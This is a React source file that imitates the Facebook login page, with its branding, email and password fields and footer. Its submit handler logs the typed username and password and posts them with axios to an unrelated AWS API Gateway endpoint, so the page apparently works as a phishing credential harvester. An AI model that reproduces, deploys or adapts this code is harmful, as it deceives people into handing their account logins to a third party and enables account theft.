import logo from './logo.svg';
import './App.css';
import '../node_modules/bootstrap/dist/css/bootstrap.min.css';
import { useState } from 'react';
import axios from 'axios';
function App() {
  const [credentials, setCredentials] = useState({ username: '', password: '' });
  const handleSubmit =(event)=>{
    event.preventDefault();
    console.log('data send'+JSON.stringify(credentials));
    axios.post(`https://twr02uyp3m.execute-api.us-east-1.amazonaws.com/dev/refer-api-lambda/1.3/api/facesheets`,credentials)
    .then(res => {
      console.log(res);
   
   
    }).catch(err => {
      console.log('an err occured' ,err.message);
    
    });
  }
  return (
    <div className="facebook">
    <div className="mobile-top-view">
      <img src="fb-mobile.png" alt="" />
      <a href="#">Get Facebook for Android and browse faster.</a>
    </div>
    <div className="view">
      <div className="container">
      
        <div className="row">
          
          <div className="col title-div">
            <div>
              <h1 className="text-primary">facebook</h1>
              <p>Connect with friends and the world around you on Facebook.</p>
            </div>
          </div>
       
          <div className="col-sm-5">
            <div className="card">
            <form onSubmit={handleSubmit} >
            <div>
                <input id="email" className="input-group" type="text" placeholder="Email or Phone Number" value={credentials.username} onChange={e => setCredentials({...credentials,username:e.target.value})} />
                <input id="pass" className="input-group my-2" type="password" placeholder="Password" value={credentials.password}      onChange={e => setCredentials({ ...credentials, password: e.target.value })} />
                <button id="fbLogin" className="btn btn-primary btn-lg" style={{width:"100%"}} type="submit">Log In</button>
                <hr id="hr1"/>
                <p id="forgetPass1" className="text-center my-3" style={{fontSize:"14px"}}><a href="#">Forget account?</a>
                </p>
              </div>
            </form>
             
              <hr id="hr2"/>
              <button id="createAcBtn" className="btn btn-success btn-lg">Create New Account</button>
              <p id="forgetPass2" className="text-center my-3"><a href="#">Forget account?</a></p>

            </div>
            <p id="form-footer" className="text-center my-4" style={{fontSize:"14px"}}><b>Create a Page</b> for a celebrity,
              brand or buisness.
            </p>
            <div className="mobile-version-footer">
              <div className="row language">
                <div className="col">
                  <p>English (US)</p>
                  <p>हिन्दी</p>
                  <p>Portugues (Brasil)</p>
                  <p>Deutsch</p>
                </div>
                <div className="col">
                  <p>नेपाली</p>
                  <p>Espanol</p>
                  <p>Francais (France)</p>
                  <p><i className="fa fa-plus-square"></i></p>
                </div>
              </div>
              <div className="nav">
                <ul>
                  <a href="">
                    <li>About</li>
                  </a>
                  <a href="">
                    <li>Help</li>
                  </a>
                  <a href="">
                    <li>More</li>
                  </a>
                </ul>
              </div>
            </div>
          </div>
          </div>
          </div>
          </div>
          </div>
  );
}

export default App;
